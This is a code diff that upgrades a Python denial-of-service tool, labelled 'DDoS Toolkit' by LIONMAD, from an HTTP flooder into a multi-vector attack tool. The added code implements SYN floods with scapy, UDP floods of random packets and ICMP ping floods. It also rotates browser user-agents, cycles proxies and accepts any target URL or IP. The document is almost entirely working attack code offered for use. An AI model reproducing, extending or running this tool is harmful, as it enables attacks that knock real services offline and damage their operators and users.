@@ -9,7 +9,6 @@ import random
 import json
 import logging
 from colorama import init, Fore, Style
-from dns import resolver
 from base64 import b64encode
 from itertools import cycle
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -23,6 +22,10 @@ import hashlib
 import zlib
 import hmac
 from tqdm import tqdm
+import socket
+import struct
+import scapy.all as scapy
+import dns.resolver  # Import dnspython for DNS resolution
 
 # Initialize colorama
 init(autoreset=True)
@@ -42,9 +45,14 @@ last_time = time.time()
 requests_lock = threading.Lock()
 rps_history = deque(maxlen=60)  # Track RPS for the last 60 seconds
 
+# Rich User-Agent list
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
 ]
 
 HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
@@ -65,9 +73,9 @@ def display_banner():
 {BLUE}
 ╔══════════════════════════════════════════════════════════╗
 ║                                                          ║
-║               Advanced HTTP Flood DDoS                   ║
+║               Advanced Multi-Vector DDoS                 ║
 ║                                                          ║
-║                  DDoS Toolkit v1.0                       ║
+║                  DDoS Toolkit v1.3                       ║
 ║                                                          ║
 ║                  Coded By: LIONMAD                       ║
 ║                                                          ║
@@ -115,18 +123,38 @@ async def check_proxy(proxy: str):
 
 def resolve_target(target_url: str):
     try:
-        domain = target_url.split("//")[-1].split("/")[0]
-        ip = resolver.resolve(domain, "A")[0].to_text()
-        print(f"Resolved {domain} to IP: {ip}")
+        domain_or_ip = target_url.split("//")[-1].split("/")[0]
+        if is_valid_ip(domain_or_ip):
+            print(f"Target is an IP address: {domain_or_ip}")
+            return domain_or_ip
+        # Use dnspython to resolve the domain to an IP
+        resolver = dns.resolver.Resolver()
+        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
+        print(f"Resolved {domain_or_ip} to IP: {ip}")
         return ip
     except Exception as e:
         logging.error(f"Failed to resolve domain: {e}")
         return None
 
-def check_target_reachable(ip: str):
+def is_valid_ip(ip: str):
     try:
-        result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
-        return result.returncode == 0
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        return False
+
+def check_target_reachable(target: str):
+    try:
+        if is_valid_ip(target):
+            result = subprocess.run(["ping", "-c", "1", "-W", "2", target], capture_output=True, text=True)
+            return result.returncode == 0
+        else:
+            ip = resolve_target(target)
+            if ip:
+                result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
+                return result.returncode == 0
+            else:
+                return False
     except Exception as e:
         logging.error(f"Ping check failed: {e}")
         return False
@@ -143,7 +171,6 @@ def generate_payload(payload_type: str):
         return None
 
 def generate_hashed_payload(payload: str, hash_type: str = "sha256"):
-    """Generate a hashed version of the payload."""
     if hash_type == "sha256":
         return hashlib.sha256(payload.encode()).hexdigest()
     elif hash_type == "md5":
@@ -154,17 +181,19 @@ def generate_hashed_payload(payload: str, hash_type: str = "sha256"):
         return payload
 
 def compress_payload(payload: str):
-    """Compress the payload using zlib."""
     return zlib.compress(payload.encode())
 
 def generate_hmac_signature(payload: str, key: str):
-    """Generate HMAC signature for the payload."""
     return hmac.new(key.encode(), payload.encode(), hashlib.sha256).hexdigest()
 
 async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json"):
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
+
+    # If the target is just an IP, prepend "http://"
+    if not target_url.startswith(("http://", "https://")):
+        target_url = f"http://{target_url}"
 
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
@@ -194,6 +223,51 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                     logging.error(f"Unexpected error during request: {e}")
 
                 await asyncio.sleep(pause_time)
+
+async def syn_flood_attack(target_ip, target_port, stop_event):
+    global requests_sent, successful_requests, failed_requests
+    while not stop_event.is_set():
+        try:
+            ip = scapy.IP(dst=target_ip)
+            tcp = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+            scapy.send(ip/tcp, verbose=False)
+            with requests_lock:
+                requests_sent += 1
+                successful_requests += 1
+        except Exception as e:
+            with requests_lock:
+                failed_requests += 1
+            logging.error(f"SYN flood attack failed: {e}")
+        await asyncio.sleep(0.1)
+
+async def udp_flood_attack(target_ip, target_port, stop_event):
+    global requests_sent, successful_requests, failed_requests
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while not stop_event.is_set():
+        try:
+            sock.sendto(os.urandom(1024), (target_ip, target_port))
+            with requests_lock:
+                requests_sent += 1
+                successful_requests += 1
+        except Exception as e:
+            with requests_lock:
+                failed_requests += 1
+            logging.error(f"UDP flood attack failed: {e}")
+        await asyncio.sleep(0.1)
+
+async def icmp_flood_attack(target_ip, stop_event):
+    global requests_sent, successful_requests, failed_requests
+    while not stop_event.is_set():
+        try:
+            subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True)
+            with requests_lock:
+                requests_sent += 1
+                successful_requests += 1
+        except Exception as e:
+            with requests_lock:
+                failed_requests += 1
+            logging.error(f"ICMP flood attack failed: {e}")
+        await asyncio.sleep(0.1)
 
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
     start_time = time.time()
@@ -239,7 +313,7 @@ def signal_handler(sig, frame):
 
 def parse_args():
     parser = argparse.ArgumentParser(description="DDoS Toolkit coded by LIONMAD")
-    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
     parser.add_argument("-d", "--duration", type=int, default=9999, help="Test duration (seconds)")
@@ -248,6 +322,11 @@ def parse_args():
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (JSON)")
     parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
+    parser.add_argument("--syn", action="store_true", help="Enable SYN flood attack")
+    parser.add_argument("--udp", action="store_true", help="Enable UDP flood attack")
+    parser.add_argument("--icmp", action="store_true", help="Enable ICMP flood attack")
+    parser.add_argument("--syn-port", type=int, default=80, help="Target port for SYN flood (default: 80)")
+    parser.add_argument("--udp-port", type=int, default=53, help="Target port for UDP flood (default: 53)")
     return parser.parse_args()
 
 async def main():
@@ -265,9 +344,9 @@ async def main():
 
     headers = json.loads(args.headers) if args.headers else None
 
-    target_ip = args.url.split("//")[-1].split("/")[0]
+    target = args.url.split("//")[-1].split("/")[0]
 
-    if not check_target_reachable(target_ip):
+    if not check_target_reachable(target):
         print(f"{RED}Exiting: Target is not reachable.{RESET}")
         exit(1)
 
@@ -277,6 +356,18 @@ async def main():
     for _ in range(args.threads):
         task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload))
         tasks.append(task)
+
+    if args.syn:
+        syn_task = asyncio.create_task(syn_flood_attack(target, args.syn_port, stop_event))
+        tasks.append(syn_task)
+
+    if args.udp:
+        udp_task = asyncio.create_task(udp_flood_attack(target, args.udp_port, stop_event))
+        tasks.append(udp_task)
+
+    if args.icmp:
+        icmp_task = asyncio.create_task(icmp_flood_attack(target, stop_event))
+        tasks.append(icmp_task)
 
     display_thread = threading.Thread(
         target=display_status, args=(stop_event, args.duration, args.results)
